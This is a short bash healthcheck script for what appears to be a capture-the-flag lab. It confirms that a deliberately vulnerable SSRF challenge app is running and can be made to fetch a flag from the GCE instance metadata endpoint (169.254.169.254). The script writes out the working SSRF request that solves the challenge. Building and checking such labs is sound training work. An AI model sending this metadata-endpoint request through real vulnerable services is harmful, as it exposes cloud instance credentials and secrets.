#!/usr/bin/env bash
# Run ON the VM. Verifies the SSRF app is up and that fetching the metadata
# attribute through it returns a flag.
source "$(git rev-parse --show-toplevel)/shared/lib/common.sh"
load_env
source "$REPO_ROOT/shared/lib/healthcheck.sh"
BASE="${1:-http://localhost:8004}"
http_status "$BASE/healthz" 200
body="$(curl -fsS --max-time 6 -X POST \
  --data-urlencode 'url=http://169.254.169.254/computeMetadata/v1/instance/attributes/cypher-flag-04' \
  "$BASE/" || true)"
if grep -qE "${FLAG_PREFIX}\{[^}]+\}" <<<"$body"; then
  ok "04 solve path returns a flag via SSRF"
else
  err "04 healthcheck FAILED — is this running on the GCE VM with the metadata attribute set?"
  exit 1
fi
